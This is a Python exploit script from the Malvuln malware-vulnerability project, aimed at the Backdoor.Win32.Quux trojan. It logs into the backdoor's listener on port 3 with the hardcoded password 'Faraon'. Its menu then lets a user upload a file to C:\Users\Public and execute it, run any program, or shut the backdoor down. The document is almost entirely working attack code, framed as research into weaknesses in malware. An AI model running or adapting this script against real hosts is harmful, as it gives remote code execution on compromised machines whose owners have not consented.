from socket import *
import time, sys
#By John Page (aka hyp3rlinx / malvuln) (c) 2022
#Threat: Backdoor.Win32.Quux
#Vulnerability: Weak Hardcoded Credentials
#Family: Quux
#Type: PE32
#MD5: 13ce53de9ca4c4e6c58f990b442cb419
#Vuln ID: MVID-2022-0656
#Dropped files: quux32.exe
#https://www.malvuln.com/advisory/13ce53de9ca4c4e6c58f990b442cb419.txt
#MIT License
#=====================================================================

BANNER="""
  ____                  ____ ___    ____           __     _ __ 
 / __ \__ ____ ____ __ |_  /|_  |  / __/_ __ ___  / /__  (_) /_
/ /_/ / // / // /\ \ /_/_ </ __/  / _/ \ \ // _ \/ / _ \/ / __/
\___\_\_,_/\_,_//_\_\/____/____/ /___//_\_\/ .__/_/\___/_/\__/ 
                                          /_/                  
                                               By Malvuln
                                MVID-2022-0656 - Nov 2022
"""

MALWARE_HOST=""
PORT=3
CREDZ="Faraon"

def chk_res(s):
    res=""
    while True:
        res += s.recv(512).decode()
        if "#" in res or "\0" in res or "\n" in res or ":" in res:
            break
    return res

def auth():
    s=socket(AF_INET, SOCK_STREAM)
    s.connect((MALWARE_HOST, PORT))

    #Authenticate
    s.send(CREDZ.encode())
    time.sleep(0.5)
    return s

def upload(the_file):
    
    s = auth()
    
    PAYLOAD="GetCurrentDirectory"
    s.send(PAYLOAD.encode())
    time.sleep(0.5)
    print(chk_res(s))

    PAYLOAD="SetCurrDir"
    s.send(PAYLOAD.encode())
    time.sleep(0.5)
    print(chk_res(s))

    PAYLOAD="C:\\Users\\Public"
    s.send(PAYLOAD.encode())
    time.sleep(0.5)
    print(chk_res(s))
    
    PAYLOAD="GetCurrentDirectory"
    s.send(PAYLOAD.encode())
    time.sleep(0.5)
    print(chk_res(s))

    PAYLOAD="SendFile"
    s.send(PAYLOAD.encode())
    time.sleep(0.5)
    
    PAYLOAD=the_file
    s.send(PAYLOAD.encode())
    time.sleep(0.5)

    PAYLOAD="Exec"
    s.send(PAYLOAD.encode())
    time.sleep(0.5)
    
    PAYLOAD=the_file
    s.send(PAYLOAD.encode())
    time.sleep(0.5)
    print(chk_res(s))
    print("[+] Uploading: "+the_file)
    
    time.sleep(2)
    s.close()

def isIP(ip):
    try:
        inet_aton(ip)
        return True
    except Exception as e:
        return False

def execute(program):

    s = auth()
    PAYLOAD="Exec"
    s.send(PAYLOAD.encode())
    time.sleep(0.5)

    PAYLOAD=program
    s.send(PAYLOAD.encode())
    time.sleep(0.5)
    print(chk_res(s))
    print("[+] Executing: "+program)
    s.close()

def kill_srv():

    s = auth()
    print(chk_res(s))
    PAYLOAD="die"
    s.send(PAYLOAD.encode())
    time.sleep(0.5)
    print("[+] Backdoor terminated!")
    s.close()

    
if __name__=="__main__":
    print(BANNER)
    if len(sys.argv) == 3:
        MALWARE_HOST=sys.argv[1]
        CMD = sys.argv[2]
        if isIP(MALWARE_HOST):
            if CMD=="1":
                _file=input("[-] File to upload: > ")
                if _file:
                    upload(_file)
                else:
                    exit(1)
            elif CMD=="2":
                pgm=input("[-] Program to run: > ")
                if pgm:
                    execute(pgm)
                else:
                    exit(1)
            elif CMD=="3":
                choice=input("[-] Kill server? 1=Yes > ")
                if choice.lower()=="1":
                    kill_srv()
        else:
            print("[!] Invalid IP!")
            exit(1)
    else:
        print("[*] QuuX32 Exploit Usage: \n[-]IP: x.x.x.x, Command (1=Upload file, 2=Exec program, 3=Kill server)")
        exit(1)
